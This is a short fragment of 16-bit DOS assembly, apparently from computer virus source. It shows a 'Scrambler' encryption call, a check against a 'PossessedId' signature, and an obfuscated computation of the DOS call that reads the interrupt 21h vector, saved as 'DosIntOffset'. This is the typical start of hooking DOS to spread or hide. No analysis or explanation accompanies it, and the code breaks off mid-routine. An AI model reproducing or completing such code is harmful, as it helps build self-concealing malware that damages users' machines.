       mov     al,25h
       call    Scrambler
       mov     di,offset PossessedId
       push    si                                 
       cld                                        
       repe movsb
       pop     si                                 
       pop     cx                                 
       neg     al                                 
       call    Scrambler
       mov     ax,word ptr ds:ExeEntry
       add     ax,(3521h-3306h)
       int     21h
       mov     DosIntOffset,bx                          
